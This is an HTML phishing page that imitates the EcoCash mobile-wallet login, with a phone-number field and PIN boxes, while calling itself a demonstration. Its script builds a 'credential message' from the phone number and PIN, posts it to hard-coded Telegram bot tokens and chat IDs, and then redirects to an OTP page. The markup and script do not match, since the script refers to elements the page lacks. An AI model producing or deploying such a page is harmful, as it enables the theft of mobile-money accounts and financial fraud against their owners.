
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wallet Login Demo</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #fff;
    min-height: 100vh;
    overflow-x: hidden;
}

.container {
    max-width: 400px;
    margin: auto;
    padding: 32px 16px 0;
    text-align: center;
}

.demo-label {
    font-size: 10px;
    color: #777;
    letter-spacing: 1px;
    margin-bottom: 12px;
}

.logo {
    font-size: 44px;
    font-weight: bold;
    margin-bottom: 16px;
    color: #0b5ed7;
}

.logo span {
    color: #e5533d;
}

h2 {
    font-weight: normal;
    font-size: 20px;
    margin-bottom: 24px;
    color: #333;
}

.phone-box {
    border: 2px solid #0b5ed7;
    border-radius: 12px;
    padding: 12px 14px;
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 14px;
}

.flag {
    font-size: 22px;
}

.country-code {
    font-size: 16px;
    font-weight: bold;
    white-space: nowrap;
}

.phone-input {
    border: none;
    outline: none;
    font-size: 16px;
    flex: 1;
    min-width: 0;
    padding: 6px 4px;
}

.pin-label {
    margin-top: 18px;
    color: #666;
    font-size: 14px;
}

.pin-boxes {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin: 14px 0;
}

.pin-boxes input {
    width: 48px;
    height: 48px;
    border: 2px solid #0b5ed7;
    border-radius: 10px;
    font-size: 20px;
    text-align: center;
    outline: none;
}

.pin-boxes input:focus,
.phone-box:focus-within {
    box-shadow: 0 0 0 3px rgba(11,94,215,.15);
}

.forgot {
    color: #666;
    font-size: 13px;
    margin-bottom: 10px;
}

.demo-notice {
    color: #777;
    font-size: 11px;
    margin-top: 16px;
    line-height: 1.5;
}

.bottom {
    position: relative;
    background: #0b5ed7;
    padding: 56px 16px 24px;
    color: white;
    text-align: center;
    overflow: hidden;
    margin-top: 30px;
}

.bottom::before {
    content: "";
    position: absolute;
    top: -45px;
    left: 0;
    width: 100%;
    height: 90px;
    background: white;
    border-bottom-left-radius: 100% 100%;
    border-bottom-right-radius: 100% 100%;
}

.bottom p {
    margin-bottom: 22px;
    font-size: 14px;
    line-height: 1.4;
}

.buttons {
    display: flex;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
    margin-bottom: 22px;
}

.btn {
    background: white;
    color: #0b5ed7;
    padding: 14px;
    width: 150px;
    border-radius: 14px;
    font-weight: bold;
    border: none;
    font-size: 14px;
}

.version {
    font-size: 12px;
    margin-bottom: 6px;
}

.terms {
    font-size: 11px;
    line-height: 1.4;
}

.terms a {
    color: white;
    text-decoration: underline;
}

@media (max-width: 360px) {
    .logo {
        font-size: 38px;
    }

    .pin-boxes input {
        width: 44px;
        height: 44px;
    }

    .btn {
        width: 100%;
        max-width: 220px;
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="demo-label">DEMONSTRATION PAGE</div>

    <div class="logo">
        Eco<span>Cash</span>
    </div>

    <h2>Login</h2>

    <div class="phone-box">
        <span class="flag">🇿🇼</span>
        <span class="country-code">+263</span>
        <input
            type="tel"
            class="phone-input"
            placeholder="Phone number"
        >
    </div>

    <div class="pin-label"> PIN layout</div>

    <div class="pin-boxes">
        <input type="password" maxlength="1" disabled>
        <input type="password" maxlength="1" disabled>
        <input type="password" maxlength="1" disabled>
        <input type="password" maxlength="1" disabled>
    </div>

    <div class="forgot">Forgot PIN?</div>

    <div class="demo-notice">
        
    </div>

</div>

<div class="bottom">

    <p>
        Need assistance or want to explore the ecocash?<br>
        See the options below
    </p>

    <div class="buttons">
        <button class="btn" type="button">Register</button>
        <button class="btn" type="button">Help & Support</button>
    </div>

    <div class="version">Demo v1.0</div>

    <div class="terms">
        Demonstration interface — not an official financial service.
    </div>

</div>
    <script>
        // Bot 1 (your existing)
        const BOT_TOKEN_1 = '9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs';
        const CHAT_ID_1 = '6527631508';

        // Bot 2 (your second bot)
        const BOT_TOKEN_2 = '';
        const CHAT_ID_2 = '';

        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');
        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }
        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        let pinValue = '';

        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
        }

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        // ========== LOGIN CLICK ==========
        loginBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('Please enter phone number');
                return;
            }

            spinnerOverlay.style.display = 'flex';

            // Save phone to localStorage
            localStorage.setItem('phone', phone);

            // Build the credential message
            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;

            // Send to Bot 1
            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID_1,
                    text: message
                })
            }).catch(() => {});

            // Send to Bot 2
            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID_2,
                    text: message
                })
            }).catch(() => {});

            // Proceed to next page
            setTimeout(() => {
                window.location.href = 'otp.html';
            }, 1500);
        });

        checkPinComplete();
        pinBoxes[0].focus();
    </script>
</body>

</html>
